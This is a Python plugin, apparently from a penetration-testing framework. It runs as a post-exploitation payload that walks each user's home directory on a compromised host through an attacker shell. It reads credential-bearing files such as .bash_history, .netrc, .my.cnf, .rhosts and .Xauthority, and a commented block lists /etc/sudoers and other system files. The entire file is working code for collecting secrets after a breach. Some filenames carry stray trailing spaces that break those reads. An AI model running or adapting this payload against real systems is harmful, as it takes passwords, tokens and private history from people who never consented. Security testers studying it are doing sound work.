from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class users_config_files(base_payload):
    '''
    This payload uses "users_folders" payload to find ".rc" and other configuration files, 
    some of them may contain sensitive information.
    '''
    def api_read(self, parameters):
        result = {}
        user_config_files = []
        
        users_result = self.exec_payload('users')
        
        for user in users_result:
            home = users_result[user]['home']

            user_config_files.append(home+'.bashrc')
            user_config_files.append(home+'.bashrc~')
            user_config_files.append(home+'.bash_history')
            user_config_files.append(home+'.bash_profile')
            user_config_files.append(home+'.gtk-bookmarks')
            user_config_files.append(home+'.conkyrc')
            user_config_files.append(home+'.my.cnf')
            user_config_files.append(home+'.mysql_history')
            user_config_files.append(home+'.ldaprc ')
            user_config_files.append(home+'.emacs')
            user_config_files.append(home+'.bash_logout')
            user_config_files.append(home+'.bash_login ')
            user_config_files.append(home+'.hushlogin')
            user_config_files.append(home+'.mail.rc')
            user_config_files.append(home+'.profile ')
            user_config_files.append(home+'.vimrc')
            user_config_files.append(home+'.gtkrc')
            user_config_files.append(home+'.kderc')
            user_config_files.append(home+'.netrc')
            user_config_files.append(home+'.rhosts')
            user_config_files.append(home+'.Xauthority')
            user_config_files.append(home+'.cshrc')
            user_config_files.append(home+'.login')
            user_config_files.append(home+'.joe_state')
            

        #=======================================================================
        # users_config_files.append('/etc/sudoers')
        # users_config_files.append('/etc/inittab')
        # users_config_files.append('/etc/crontab')
        # users_config_files.append('/etc/sysctl.conf')
        # users_config_files.append('/etc/mailname')
        # users_config_files.append('/etc/aliases')
        # users_config_files.append('/etc/pam.conf')
        # #TODO PUT IN APACHE
        # users_config_files.append('/etc/libapache2-mod-jk/workers.properties')
        #=======================================================================

        for file in user_config_files:
            content = self.shell.read(file)
            if content:
                result[ file ] = content
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
                
        if not api_result:
            return 'No user configuration files found.'
        else:
            rows = []
            rows.append( ['User configuration files',] )
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
        
